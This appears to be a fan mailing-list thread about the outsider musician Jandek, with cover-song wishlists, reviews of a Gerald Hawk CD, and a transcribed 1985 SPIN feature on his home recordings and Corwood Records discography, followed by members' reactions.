Question for new thread: You liked/hated/ignored the tribute album....Now 
what songs would you want to hear Jandek himself cover? Keep in mind he could 
attempt to keep the melody or just use the lyrics, and that they can be from 
any era. Describe if necessary.

Some of my picks (all would be done by '88-'91 Jandek):

Scott Walker-Boy Child 
Television-Marquee Moon
Funkadelic-Maggot Brain (all of above 2 guitar electric)
Neil Young- Ambulance Blues (acoustic)
Spacemen 3-Walkin' With Jesus (acoustic)
The Fall-Hip Priest (electric, duet with Nancy)

I always thought Tom's vocal performance on "Mars" from the 1992 disc 
had some Jandekian qualities, so I can see where this would fit...

Jandek's cover of "House of the Rising Sun" is very beautiful.  I would
like to hear some more old 50s-60s nuggets like Last Kiss, Money (That's
what I want), Unchained Melody, any Link Wray or Johnny Cash tunes or any
old soul tunes like "I only have eyes for you."

Excellent choices.  I can especially hear "Dog" given a Jandekian
Performance!  As for my choices below, just wanted to add that the selection
favoured tracks that had either a vaguely obsessive/paranoid tone to them,
or a "lonesome" feel that could respond well to the Jandek approach.

And that Dylan notice - hmm, another piece of teh puzzle falls into place.

And finally:  I trust no one else has dug up that old Spin article by John
Trubee yet, eh?  I'm heading off to visit the parents at Xmas in a couple of
weeks and know where to dig that issue out of storage; interested parties
pls remind me to follow through, eh?

LAter!

Oddly enough, I was going to put "Stand in Line" in my original list, which 
is the song after that on the F.Lips LP. But thinking about it I would put a 
Blue Corpsish rendition of Mercury Rev's "Frittering" on there.

I remember playing this on my radio show (WHPK "The Pride of the South Side"
at the U of Chicago), thinking it would be a cover, but it wasn't, just a
Jandek song with the same name as the famous song. Or are you just trying to
be silly?

Bradley's right--check out the lyrics.  (We're talking the one on 
_Blue Corpse_, right?)

It's a cover.  He uses quite a few lines of the origional lyric in his
version.  He just plays a very liberal translation of the music (meaning
he doesn't use any of the original chord changes or vocal melodies :) so
it's kinda hard to tell.

On another note, I listened to "Bring on Fatima" last night and noticed
the reference to Frank Zappa's "Call any Vegetable" at the beginning of
the song (Caledonia Mahogany's Elbows.)  Is this a widely used term, or is
it something FZ made up???

anyone heard this Gerald Hawk cd yet?


"Debut release by this obscure filmmaker (?).  The
last non-member of the Sun City Girls to release
something on their Abduction label (Hal Russell)
didn't live long to tell about it, but Gerald
evidently thinks he's made of tougher stuff.  This
recording features acoustic muddle and the whispered
rants of somebody with no fear of waking up in a
bunker  A certain amount of Jandekian
idolation/emulation/ass-ination raises the intrigue
and as for the wind, it continues to blow.  Don't be
afraid to jump, straight down."
				Forced Exposure




"I believe that this is the first recording for Gerald
Hawk, who managed to land this recording on the Sun
City Girls' Abduction label. I have to say that this
is more interesting than the recent series of monthly
Sun City Girls releases, sounding much more like the
solo recordings from either of the Bishop brothers.
Simple off key acoustic guitar strum with a Jandekian
vocal meandering that often has a ghostly double as an
ominous whisper. Certainly for fans of No Neck Blues
Band and the aforementioned Sun City Girls."
				Aquarius Records

Seasons In The Sun by Terry Jacks - great song. Kinda twisted. "Goodbye

Hey kids,

OK! Here's the long-lost SPIN article from back in 1985 by John
Trubee and friend, retrieved from my parents' basement during
my current Xmas visit and typed up in 15 minutes between various
gathrings.  This was the first time I heard of Jandek as a high
school newbie back in the day, and the last time until I started
reading Forced Exposure a couple years later. The feature adds
a few interesting details to the history which seem at odds with
what we appear to know now, but are nevertheless pretty clearly
based on personal contact.  Enjoy!  And Seth, be sure to add
this to your page, eh?

FYI: The only graphic to accompany the piece was a picture of
the "Ready for the House" cover.  Although a pic of Qadaffi graced
a piece on the same page...

JANDEK
by John Trubee and Edward Rasen
SPIN, Vol 1 no. 5 (September 1985), p. 12

Jandek is a virtually unknown poet living deep in the heart of
Texas who records eerie poems on a primitive reel-to-reel tape
recorder in his apartment.  Then, with money he earns as a machinist,
he presses 300 albums that are sold by mail order through obscure
underground newsletters.  Nine albums have been released in this
manner during the last five years, and a tenth, simply called
Nine-Thirty, should be available sometime this year.  Small matters,
such as tires for Jandek's car, affect the production schedule.

Jandek's songs are so sparse, so obscure, and so downright unusual
that most normal people cannot listen to them for more than a
few moments.  "The rocks crumble, unto dust they die," croons
Jandek,in a monotonous,atonal voice.  Some listeners involuntarily
fidget, others scowl and sneer before making snide remarks, and
a few assume a fetal position or lapse into a catatonic state.
 These strange and extreme reactions are real, not figments of
our imagination.  It is for those very reasons that fans eagerly
await and purchase each new album.

Uninitiated listeners may think that Jandek sounds like a drug-warped
hippie moaning surreal poetry while playing an obnoxiously out-of-tune
guitar.  And there is room here for argument.  However, Jandek
insists that he tunes the guitar for each recording session,
in fact, every song, but rather than use traditional methods,
he creates unconventional tone scales that mach the aural imagery.

An enigmatic recluse, Jandek records his songs while alone in
his apartment somewhere in Houston.  Occasionally, he hits the
microphone or knocks it over with his guitar, imbuing the song
with a charming, homemade quality.  Rich, exotic lyrics may segue
into brief flights of frustration and anger.  However, Jandek's
poetry is not all dark and depressing.  The lyrics of "Nancy
sings" are suffused with the mystical naturalism of the Native
Americans:

"A dozen drops/Fall from your face/ Shaking the rain in a quiet
place/Shining clean, a fresh new day/Wakes up the world in a
fragrant bouquet/Listen to the sound of a constant fall/Skies
give water for life of all/If you reach into the air/Rain will
come to kiss your hair"*

Jandek's Six and Six album addresses the ebb and flow of people
and things in everyone's life.  "I Knew You would Leave" is about
a rock that crumbles into dust:

"The rocks crumble/Unto dust they die/Once hard/Stuff of mountains/Now
soft powder among the sands/Who dares crush a rock/Oh rock/No
rock/Reduced to the winds/Scatter your parts/You are not one
but many/To those you shall succumb"*

Jandek believes that each person's essential spirit exists forever
in the universe.  The imprints made on other people remain eternal
in the memories of all those involved.

Jandek seems an incredibly isolated but committed artist.  He
refuses to discuss his life or his songs, saying only that each
speaks for itself.  Also, he refuses to perform in public.  The
mysterious rock poet is unknown in Houston's small music community
except by the folks at the record-pressing factory.  Some of
the album covers, however, contain grainy, slightly out-of-focus
pictures that may be of him.  There are no known photographs
of him.

Other albums feature stark photographs of a guitar leaning against
a wall, or portions of a sparsely furnished room - presumably
all factual documents to help maintain the eternal spirit.  The
front cover of each album is a sparse visual image without words
or title.  The back covers simply list the songs in sequence,
time of each track, the album's catalog number, and the label's
address.

Jandek spends $600 for each release of 300 albums; color covers
cost an additional $200.  Everything from the recording tape
to the shrink-wrap on the albums is funded with earnings from
his regular eight-to-five job.  So far, none of the albums has
sold more than 150 copies, which makes this an unprofitable venture.

The Jandek Discography:

0739 Ready for the House
0740 Six and Six
0741 Later On
0742 Chair Beside a Window
0743 Living in a Moos so Blue
0744 Staring at the Cellophane
0745 Your Turn to Fall
0746 The Rocks Crumble
0747 Interstellar Discussion
0748 Nine-Thirty

All 10 LPs are available on Corwood Records at $6 per single
album or $55 per 25-count box (any mix).  Only prepaid orders
can be accepted.  To order, or for more information about the
Jandek albums, write to:

This is very cool. But: if no one has "seen" Jandek, how does all the info
about the apartment,m number of albums, tires, etc. come to be known? How
much more info is out there? Its interesting that all this info is 15 years
old, but its the first time in the approcimately-a-year that I've been on
this list that I've heard of much of it. More mystery?.....

P.

If I'm not mistaken, the original (en francais) is by Edward Aznavour, who
did the first English version I heard on an old Reprise album. Far more
chilling than the Terry Jacks bublegum version, the strength of the song is
that it survived Mr. Jacks and still compelled!

Seasons In The Sun by Terry Jacks - great song. Kinda twisted. "Goodbye

Get thee to http://www.forcedexposure.com/ where you can find what's 
in print.  (All of it on CD, I think, although I might be wrong.) 
There are certainly other outlets, but this is the one I've used.

I have a few comments/statements/questions to forward in regards to the 
interesting 1985 Spin Feature posted the other day (thanks again 
smathesn@istar.ca):

I find it surprising (and, thus, a bit odd that I had this notion in my mind 
to begin with) that Jandek was recording from his/an apartment. Thinking 
about it now, it would seem pretty obvious (probably a single guy, seemingly 
a loner-type), but I always had the impression he was recording and/or 
living in a big old empty house. Maybe the record covers prompted me to 
think this, I don't really know, but it struck me that I had never thought 
about Jandek living in an apartment before.  I wonder if the neighbors ever 
heard or complained about the strange sounds emanating from his place (if 
this were in fact the case).

Some Questions:

1. Can anyone here define what exactly a "machinist" ("one who operates, 
constructs or repairs machines...", but more specific) is, what they do, and 
if, in general, they make a good living. One would have to think that 
financially Jandek was doing decently, especially if he was doing this - 
presumably - out of his own pocket.

2. Is anyone aware of the "obscure underground newsletters" that 
Corwood/Jandek were advertising in? What were the adds like? Are they the 
same as the ones in Spin or whatever?

The line about tuning his guitar ("However, Jandek insists that he tunes the 
guitar for each recording session, in fact, every song, but rather than use 
traditional methods,he creates unconventional tone scales that mach the 
aural imagery.") is exactly right. It is a definite misconception that old 
Janky is out of tune or not playing proper chords. When I played it for my 
dad (he was a guitar/music teacher for many years), inquiring into this he 
said, "it sounds terrible, but he definitely knows how to play and what he 
is doing... it's interesting" and later he showed me exactly how Jandek 
would be playing.

It really sounds like these two fellas who wrote the article had contact w/ 
old SS. It seems to me they had a few interesting and in-depth (as much as 
he would allow anyway) conversations with the man, especially since he 
divulged his beliefs to them (i.e. "Jandek believes that each person's 
essential spirit exists forever in the universe.  The imprints made on other 
people remain eternal in the memories of all those involved."). I find this 
all very interesting.

Anyway, I've said enough.

Take care,

M.

Today, Snowhite was turning 18. The 7 Dwarfs always where very educated and
polite with Snowhite. When they go out work at mornign, they promissed a 
*huge* surprise. Snowhite was anxious. Suddlently, the door open, and the Seven
Dwarfs enter...
